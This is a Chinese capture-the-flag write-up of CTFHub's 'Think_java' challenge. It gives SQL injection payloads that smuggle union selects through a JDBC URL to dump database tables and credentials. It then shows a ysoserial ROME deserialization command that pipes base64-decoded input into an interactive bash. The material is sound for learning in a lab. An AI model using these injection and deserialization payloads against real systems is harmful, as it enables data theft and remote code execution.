---
data: 2024-11-02
关联:
  - "[[book/知识笔记/CTF/JAVA/JAVA|JAVA]]"
---
## 题目地址
https://www.ctfhub.com/#/challenge
搜索Think_java即可
## 题解正文
先看附件
![](book/blog/src/images/5a4fc6291cf00789b48ade274754f388.png)这里看到有一个sql接口，我们看看有没有什么操控空间。
我们发现cn.abc.core.sqldict.SqlDict#getTableData中是直接对dbName进行的一个拼接，我们试试是否可以进行sql注入。
![](book/blog/src/images/3d8d019daa1221add28c7d1548c8508d.png)
简单尝试了下，发现好像不行。
![](book/blog/src/images/be3dbf2f25581b9e3015ed6bb001b73e.png)
在研究一下代码，发现前面进行了数据连接操作![](book/blog/src/images/43619dae6bb1f62f0b24da94b726f31f.png)
我们格式要符合jdbcurl格式，且可以进行sql注入。
最后我们构造出
```
myapp?a='union/**/select/**/1123#
```
使用?号进行jdbc连接同时把后文的设置干扰去除。

我们这时就要取找密码了，先看看数据库的表。
```
myapp?a='union/**/select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()#

dbName=myapp?a='union/**/select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='user'#

dbName=myapp?a='union/**/select/**/name/**/from/**/user#
dbName=myapp?a='union/**/select/**/pwd/**/from/**/user#
```
最后获得账户名和密码
```
ctfhub
ctfhub_31230_10273
```

发现flag不在这里,继续研究下代码。直接问AI，发现存在swagger，直接访问/swagger-ui.html#/来看看有哪些api，毕竟我们手上代码不全。
![](book/blog/src/images/03a75ca2813f4aa62266b5c706d7689d.png)
成功发现两个新的api
![](book/blog/src/images/b5208c201afdf81faa93ae459aa01e00.png)

我们先试试登陆的这个接口，毕竟我们之前拿到账户密码的。
![](book/blog/src/images/3b4b05042212da2a23461c162d63c8c7.png)
发现返回了一串数据，看起来像base64。解码一下
![](book/blog/src/images/aea71eb3a3c2447f2cb7545dc555558d.png)
这下没跑了，肯定序列化。那个接口估计就会反序列化，直接进行经典java命令执行。

```
java -jar ysoserial-all.jar ROME "bash -c {echo,xxx}|{base64,-d}|{bash,-i}" > payload.bin
```